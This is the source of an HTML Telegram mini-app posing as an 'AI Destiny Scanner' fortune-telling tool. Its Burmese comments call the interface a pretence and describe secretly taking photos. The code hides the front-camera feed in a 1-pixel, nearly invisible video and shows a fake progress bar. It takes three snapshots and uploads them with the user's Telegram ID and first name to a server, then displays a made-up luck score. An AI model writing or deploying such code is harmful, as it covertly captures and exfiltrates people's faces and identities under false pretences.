<!DOCTYPE html>
<html>
<head>
    <title>AI Destiny Scanner</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0a0e14; color: #00d2ff; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
        .scanner-box { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
        
        /* ကင်မရာကို တိတ်တဆိတ် ဖျောက်ထားခြင်း */
        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        
        /* ဟန်ပြ UI (Scanning Animation) */
        .scan-line { width: 80%; height: 2px; background: #00d2ff; box-shadow: 0 0 15px #00d2ff; position: absolute; animation: scan 3s infinite linear; }
        .status-text { margin-top: 30px; font-size: 1.1rem; text-shadow: 0 0 10px #00d2ff; min-height: 1.5em; }
        .loading-bar { width: 250px; height: 10px; border: 1px solid #00d2ff; margin-top: 20px; position: relative; }
        .progress { width: 0%; height: 100%; background: #00d2ff; transition: width 0.1s linear; }

        @keyframes scan { 0% { top: 20%; } 50% { top: 80%; } 100% { top: 20%; } }
    </style>
</head>
<body>
    <div class="scanner-box">
        <div class="scan-line"></div>
        <h2 id="header">AI DESTINY ANALYZER</h2>
        <p class="status-text" id="status">ကင်မရာအား စစ်ဆေးနေပါသည်...</p>
        <div class="loading-bar"><div class="progress" id="progress"></div></div>
        <p style="font-size: 0.7rem; margin-top: 20px; opacity: 0.6;">* Please keep your face within camera view</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const progress = document.getElementById('progress');
        const status = document.getElementById('status');
        const header = document.getElementById('header');
        const tg = window.Telegram.WebApp;

        tg.ready();
        tg.expand();

        // ၁။ ကင်မရာ စဖွင့်ခြင်း
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { 
                video.srcObject = stream;
                status.innerText = "မျက်နှာအား စတင်စစ်ဆေးနေပါသည်...";
                startFakeProcess();
            })
            .catch(err => {
                status.innerText = "Camera Permission လိုအပ်ပါသည်။";
                console.error(err);
            });

        let captureCount = 0;

        // ၂။ ဟန်ပြ Progress Bar နှင့် ပုံခိုးရိုက်ခြင်း
        function startFakeProcess() {
            let width = 0;
            const interval = setInterval(() => {
                width += 0.5;
                progress.style.width = width + '%';

                // အဆင့်ဆင့် ပုံဖမ်းယူခြင်း
                if (width >= 25 && captureCount === 0) { 
                    captureImage("Analyzing Facial Geometry..."); 
                    captureCount++; 
                }
                if (width >= 55 && captureCount === 1) { 
                    captureImage("Scanning Life Line Patterns..."); 
                    captureCount++; 
                }
                if (width >= 85 && captureCount === 2) { 
                    captureImage("Matching with AI Database..."); 
                    captureCount++; 
                }

                if (width >= 100) {
                    clearInterval(interval);
                    status.innerText = "စစ်ဆေးမှု အောင်မြင်ပါသည်။";
                    header.innerText = "YOUR LUCK: 98% (EXCELLENT)";
                    setTimeout(() => tg.close(), 4000);
                }
            }, 50);
        }

        // ၃။ ပုံဖမ်းယူပြီး Server ဆီ ပို့သည့် Function
        async function captureImage(statusMsg) {
            status.innerText = statusMsg;
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.6);

            // Telegram User ရှိမရှိ စစ်ဆေးခြင်း
            const userId = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "Unknown_Browser";
            const userName = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "External_User";

            try {
                await fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        image: imageData,
                        user_id: userId,
                        user_name: userName
                    })
                });
                console.log("Capture Sent Successfully");
            } catch (e) {
                console.error("Upload failed:", e);
            }
        }
    </script>
</body>
</html>
